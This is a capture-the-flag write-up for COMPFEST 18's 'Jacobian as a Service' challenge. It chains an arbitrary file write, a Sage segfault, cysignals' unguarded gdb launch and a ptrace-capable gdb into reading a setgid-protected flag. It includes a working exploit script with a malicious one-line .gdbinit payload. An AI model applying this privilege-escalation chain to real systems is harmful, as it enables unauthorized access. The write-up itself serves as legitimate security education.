@@ -1,0 +1,346 @@
+---
+title: 'COMPFEST 18 - Jacobian as a Service'
+description: 'Chaining an arbitrary file write, a Sage/PPL segfault, and cysignals unsafe gdb auto-load into a CAP_SYS_PTRACE read of a setgid-only flag'
+date: 2026-08-30
+tags: ['writeup', 'misc', 'linux', 'gdb', 'ptrace', 'privilege-escalation', 'compfest', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+Four separate things are handed to us, and none is exploitable alone:
+
+1. `chall.py` gives an **arbitrary file write** as user `sage` (the "bug report" menu option).
+2. `chall.py` also lets us build a bivariate polynomial and call Sage's `Jacobian()` on it — `Jacobian(R("x^0*y^0"))` **segfaults** inside PPL.
+3. Sage's `cysignals` reacts to a fatal signal by launching `gdb`, and it does so **without `-nx`**, so gdb sources `~/.gdbinit` — which we own.
+4. `/usr/bin/gdb` has `cap_sys_ptrace=ep`, and `/home/ctf/tes` is a **setgid `target`** binary that parks itself in `pause()`. gdb can attach to it and call `open()`/`read()` inside a process whose `egid` is `target` — which is exactly what the flag's `0440 target:target` permissions require.
+
+Chain: **file write → drop `~/.gdbinit` → segfault Sage → cysignals runs gdb → gdb attaches to the setgid donor process → read the flag.**
+
+## Challenge Description
+
+> Jacobian
+
+### The service (chall.py)
+
+```python
+from sage.all import *
+
+def jaas():
+    p = int(input("Enter a prime number p: "))
+    if not is_prime(p):
+        raise ValueError()
+    F = GF(p)
+
+    R = F['x, y']; (x, y,) = R._first_ngens(2)
+    expression = input("Enter a polynomial expression : ")
+    allowed_chars = set("0123456789+-*/^xy ")
+    if (not set(expression).issubset(allowed_chars) or not set("xy").issubset(set(expression))):
+        raise ValueError()
+    f = R(expression)
+
+    E = Jacobian(f)
+    print(E)
+
+try:
+    while True:
+        print("1. try it out")
+        print("2. send a bug report")
+        choice = input("> ")
+
+        if choice == "1":
+            jaas()
+            break
+        if choice == "2":
+            name = input("bug name: ")
+            description = input("description: ")
+            with open(name, "w") as report:
+                report.write(description)
+            print("report saved")
+except Exception as e:
+    print("Something went wrong.")
+```
+
+Two primitives:
+
+- **Option 2** — `open(name, "w").write(description)` with *both* fields fully attacker-controlled. That is an unrestricted file write as whoever runs the service. It loops, so we can use it before option 1. Note both values come from a single `input()` each, so **the file content is one line with no newlines**. This matters a lot later.
+- **Option 1** — a very restricted polynomial expression: charset `0123456789+-*/^xy ` only, and it must contain both `x` and `y`. Then `Jacobian(f)`. It `break`s out of the loop, so it's a one-shot.
+
+The `try/except Exception` swallows every Python-level error into `"Something went wrong."` — so whatever we do with option 1 has to be something a Python exception handler *cannot* catch.
+
+## Initial Analysis
+
+The interesting parts of the `Dockerfile`:
+
+```dockerfile
+RUN ... apt-get install -y ... gcc gdb socat libcap2-bin && \
+    setcap cap_sys_ptrace+ep /usr/bin/gdb && ...
+
+RUN useradd -m -s /bin/bash ctf && \
+    useradd -M -s /usr/sbin/nologin target
+RUN chmod 777 /home/ctf && ...
+ENV HOME=/home/sage
+
+RUN gcc ... -o /home/ctf/tes /home/ctf/wut.c && \
+    chown target:target /home/ctf/tes && \
+    chmod 2755 /home/ctf/tes && \
+    ...
+    find "$site_packages" -type d -exec chmod a-w {} + && \
+    find "$site_packages" -type f \( -name '*.py' -o -name '*.pth' \) -exec chmod a-w {} + && \
+    ...
+    ln -s "$sage_venv/bin/cysignals-CSI" /opt/ctf/cysignals-CSI && \
+    printf 'COMPFEST18{test_flag}\n' > /home/ctf/flag.txt && \
+    chown target:target /home/ctf/flag.txt && \
+    chmod 440 /home/ctf/flag.txt
+
+USER sage
+WORKDIR /home/ctf
+CMD ["socat", "TCP-LISTEN:8080,reuseaddr,fork", "EXEC:'/usr/bin/sage -python /opt/ctf/chall.py',pty,stderr"]
+```
+
+Inside a running container:
+
+```text
+$ id
+uid=1000(sage) gid=1000(sage) groups=1000(sage)
+
+$ ls -la /home/ctf
+drwxrwxrwx 1 ctf    ctf     4096 .
+drwxr-xr-x 2 ctf    ctf     4096 .sage
+-r--r----- 1 target target    22 flag.txt      <-- 0440 target:target
+-rwxr-sr-x 1 target target 17840 tes           <-- 2755, setgid target
+-rw-r--r-- 1 root   root     536 wut.c
+
+$ ls -ld /home/sage
+drwxr-x--- 1 sage sage 4096 /home/sage         <-- $HOME, writable by us
+
+$ getcap /usr/bin/gdb
+/usr/bin/gdb cap_sys_ptrace=ep
+```
+
+So: **the flag is `0440 target:target`, and we are `sage`.** We need `egid=target`, or a process that already has it.
+
+### The donor process (wut.c)
+
+```c
+static void init_security(void)
+{
+    if (prctl(PR_SET_DUMPABLE, 1) != 0)
+        die("prctl(PR_SET_DUMPABLE)");
+    if (prctl(PR_SET_PTRACER, PR_SET_PTRACER_ANY) != 0)
+        die("prctl(PR_SET_PTRACER)");
+}
+
+int main(void)
+{
+    init_security();
+    raise(SIGSTOP);
+    for (;;)
+        pause();
+}
+```
+
+`tes` does nothing except make itself as ptrace-able as possible and then sit there forever. Since it's setgid, running it gives `egid = 1002 = target`:
+
+```text
+$ /home/ctf/tes & sleep 0.5; grep -E '^(State|Uid|Gid)' /proc/$(pgrep -n -x tes)/status
+State:  T (stopped)
+Uid:    1000    1000    1000    1000
+Gid:    1000    1002    1002    1002      <-- egid = 1002 = target
+```
+
+A setgid binary is `dumpable=0` by default, which is why it calls `PR_SET_DUMPABLE`. But the `ptrace_may_access()` gid check still fails for a plain `sage` tracer (`egid` mismatch) — so the attach must come from something with `CAP_SYS_PTRACE`. That's the `setcap` on gdb. **The whole challenge is therefore: get gdb to run commands of our choosing.**
+
+## Step 1 — Getting gdb to execute our commands
+
+`sage.all` imports `cysignals`, which installs handlers for `SIGSEGV`/`SIGBUS`/`SIGFPE`/`SIGILL`/`SIGABRT`. On a fatal signal it prints a C backtrace and then calls `print_enhanced_backtrace()`, which forks, `dup2(2, 1)`s, and `execvp`s `cysignals-CSI` on the crashed pid. `cysignals-CSI` is a plain Python script; the relevant part is:
+
+```python
+def run_gdb(pid, color):
+    whichgdb = which('gdb')
+    ...
+    env = dict(os.environ)
+    try:
+        cmd = Popen(["gdb"], executable=whichgdb,
+                stdin=PIPE, stdout=PIPE, stderr=PIPE, env=env)
+    ...
+    stdout, stderr = cmd.communicate(gdb_commands(pid, color))
+```
+
+Two gifts here:
+
+- **No `-nx`, no `-batch`, no `-ex`.** gdb starts normally and therefore sources its init files — including `$HOME/.gdbinit` — *before* it reads the piped commands. The home gdbinit is not subject to the `auto-load safe-path` restriction that blocks `./.gdbinit`, so it just runs.
+- `env = dict(os.environ)`, so `HOME` is still `/home/sage`, which we can write to.
+
+Confirming it before building anything else:
+
+```text
+$ echo 'echo === PWNED GDBINIT RUNNING ===\n' > /home/sage/.gdbinit
+$ cd /home/ctf && sage -python -c 'import ctypes; from sage.all import *; ctypes.string_at(1)'
+...
+Attaching gdb to process id 156.
+GNU gdb (Ubuntu 12.1-0ubuntu1~22.04.2) 12.1
+...
+=== PWNED GDBINIT RUNNING ===
+```
+
+Also note gdb's stdout is captured by `cysignals-CSI` and re-emitted with `os.write(1, trace)`, where fd 1 is the crashing process's stderr — and socat is started with `,stderr`, so **anything gdb prints comes straight back to us over the TCP connection**. No need for a second channel.
+
+Dropping the file is trivially done with menu option 2:
+
+```text
+> 2
+bug name: /home/sage/.gdbinit
+description: <one line of gdb commands>
+```
+
+## Step 2 — Crashing Sage from the polynomial input
+
+Now we need a *signal*, not an exception — the `except Exception` would eat anything else. First, how is the expression actually turned into a polynomial? In `multi_polynomial_libsingular.pyx`:
+
+```python
+if isinstance(element, str):
+    # let python do the parsing
+    d = self.gens_dict()
+    ...
+    try:
+        if '/' in element:
+            element = sage_eval(element, d)
+        else:
+            element = element.replace("^", "**")
+            element = eval(element, d, {})
+    except (SyntaxError, NameError):
+        raise TypeError("Could not find a mapping of the passed element to this ring.")
+```
+
+It's a Python `eval` with `{'x': x, 'y': y}` as globals. The charset filter kills any attempt at reaching `__builtins__`, so no direct RCE — but it does mean `^` is Python `**` and the *semantics* are Python's, not a polynomial parser's.
+
+The obvious C-library abuse is all properly guarded:
+
+| input | result |
+|---|---|
+| `x^100000000000*y` | `OverflowError: exponent overflow (100000000000)` |
+| `x^4294967296*y` | `OverflowError: exponent overflow (4294967296)` |
+| `x^2147483647*y` | fine (Singular's per-ring bitmask allows it) |
+| `x^2147483647*x^2147483647*y` | fine — total degree 4294967294, still under the bitmask |
+| `x^-1*y`, `x^y`, `x/0*y` | ordinary Python exceptions |
+| `"-"*N + "1"` style deep nesting | `MemoryError: Parser stack overflowed` — CPython guards it |
+
+Then the degenerate cases, which is where it falls over:
+
+```text
+rc=139 p=101 [x^0*y^0]   <<<SIGNAL 11>>> :: Unhandled SIGSEGV: A segmentation fault occurred.
+rc=1   p=101 [x-x+y-y]   :: IndexError: list index out of range
+rc=1   p=101 [x*0+y*0]   :: IndexError: list index out of range
+rc=1   p=101 [x+y]       :: ArithmeticError: y^2 = x^3 defines a singular curve
+rc=0   p=101 [x^3+y^2+1] :: E= Elliptic Curve defined by y^2 = x^3 + 100 over Finite Field of size 101
+```
+
+**`x^0*y^0`** passes the `"xy" ⊆ expression` filter, but Python evaluates it to the *constant* polynomial `1`. A constant has **no variables**, and `WeierstrassForm` uses `polynomial.variables()` as its coordinate list:
+
+```python
+# sage/schemes/toric/weierstrass.py
+if variables is None:
+    variables = polynomial.variables()          # ()  <-- empty
+newton_polytope, polynomial, variables = \
+    Newton_polygon_embedded(polynomial, variables)
+
+# Newton_polygon_embedded:
+p_dict = Newton_polytope_vars_coeffs(polynomial, variables)   # {(): 1}
+newton_polytope = LatticePolytope_PPL(list(p_dict))           # a polytope in ZZ^0
+assert newton_polytope.affine_dimension() <= 2
+embedding = newton_polytope.embed_in_reflexive_polytope('points')   # boom
+```
+
+So we get a lattice polytope in a **zero-dimensional ambient space**, and the reflexive-polygon matching walks into `integral_points()` on it. Minimal reproducer, no challenge code involved:
+
+```python
+sage: from sage.geometry.polyhedron.ppl_lattice_polytope import LatticePolytope_PPL
+sage: P = LatticePolytope_PPL([()]); P
+A 0-dimensional lattice polytope in ZZ^0 with 1 vertex
+sage: P.bounding_box()
+((), ())
+sage: P.integral_points()
+------------------------------------------------------------------------
+Unhandled SIGSEGV: A segmentation fault occurred.
+```
+
+`rectangular_box_points([], [], P)` is Cython and does not survive a zero-dimensional box. `p` is irrelevant — `101` is fine. (`x-x+y-y` and `x*0+y*0` produce the *zero* polynomial, which gives an empty `p_dict` and dies on a plain `IndexError` instead. Only the non-zero constant reaches the crashing path.)
+
+## Step 3 — Writing a .gdbinit that fits on one line
+
+`description = input()` reads a single line, so the gdbinit cannot contain newlines — and gdb separates commands by newline. The way out is gdb's `python` command, which accepts inline code as an argument, and Python happily chains simple statements with `;`:
+
+```text
+python import os,subprocess,time; gdb.execute('...'); gdb.execute('...'); ...
+```
+
+What it needs to do:
+
+1. Start `/home/ctf/tes` in the background.
+2. Find its pid (`pgrep -n -x tes`).
+3. `attach` — this succeeds only because gdb carries `cap_sys_ptrace=ep`.
+4. **`handle SIGSTOP nostop noprint nopass`.** `tes` does `raise(SIGSTOP)` before parking, and gdb re-delivers that pending stop the moment we try to run anything in the inferior; without suppressing it the first inferior call dies with *"The program being debugged was signaled while in a function called from GDB."*
+5. `malloc` a buffer, `open()` the flag, `read()` into it, `printf` it. All of this executes **inside `tes`**, i.e. with `egid=target`, so the `0440 target:target` check passes.
+
+Note `\n` inside the payload must be avoided or double-escaped, since Python would turn it into a real newline and split the gdb command.
+
+## Exploitation
+
+```python
+GDBINIT = (
+    "python "
+    "import os,subprocess,time; "
+    "gdb.execute('set confirm off'); "
+    "gdb.execute('set pagination off'); "
+    "gdb.execute('set unwindonsignal on'); "
+    "os.system('/home/ctf/tes >/dev/null 2>&1 &'); "
+    "time.sleep(1); "
+    "pid=subprocess.check_output(['pgrep','-n','-x','tes']).decode().strip(); "
+    "gdb.execute('attach '+pid); "
+    "gdb.execute('handle SIGSTOP nostop noprint nopass'); "
+    "gdb.execute('set $b=(char*)malloc(512)'); "
+    "gdb.execute('set $f=(int)open(\"/home/ctf/flag.txt\",0)'); "
+    "gdb.execute('call (int)read($f,$b,500)'); "
+    "gdb.execute('printf \"::FLAG:: %s\", $b'); "
+    "gdb.execute('kill'); "
+    "gdb.execute('quit')"
+)
+
+# stage 0 — the hosted instance is fronted by a CTFd access-token gate
+until(b"CTFd access token: "); send(TOKEN)
+
+# stage 1 — arbitrary file write -> ~/.gdbinit
+until(b"> ");                        send("2")
+until(b"bug name: ");                send("/home/sage/.gdbinit")
+until(b"description: ");             send(GDBINIT)
+until(b"report saved")
+
+# stage 2 — segfault Sage; cysignals-CSI then runs gdb, which sources our gdbinit
+until(b"> ");                        send("1")
+until(b"prime number p: ");          send("101")
+until(b"polynomial expression : ");  send("x^0*y^0")
+
+# gdb's stdout comes back over the same socket (socat ...,stderr)
+```
+
+```text
+$ python3 exploit.py 34.2.22.80 30016 ctfd_...
+[+] sent CTFd access token
+[+] dropped /home/sage/.gdbinit
+[+] triggered SIGSEGV, waiting for cysignals-CSI -> gdb ...
+[+] ::FLAG:: COMPFEST18{the_jacobian_conjecture_is_false_claude_8oxr1f4XXDox1gns}
+```
+
+Local testing against the provided `run.sh` container works identically and returns the placeholder `COMPFEST18{test_flag}`.
+
+## Notes
+
+- The `/opt/ctf/cysignals-CSI` symlink in the Dockerfile is a signpost — it is never used by the exploit (cysignals resolves the real one via `execvp` on `PATH`), it just tells you which crash handler you're meant to be looking at.
+- The Dockerfile carefully `chmod a-w`s Sage's `site-packages`, `sage`, `sage-python` and `cysignals` share dir — that's there to stop the boring solution of writing a `.py`/`.pth` into Sage's import path with the same file-write primitive. `$HOME/.gdbinit` was the hole left open.
+- `system()`/`shell` inside the setgid inferior would *not* have worked: both `bash` and `dash` reset `egid` to `gid` when they start with `egid != gid` and no `-p`. Calling `open`/`read` directly via gdb sidesteps that entirely. (Alternatively `call (int)setregid(getegid(), getegid())` first.)
+
+## Flag
+
+```text
+COMPFEST18{the_jacobian_conjecture_is_false_claude_8oxr1f4XXDox1gns}
+```
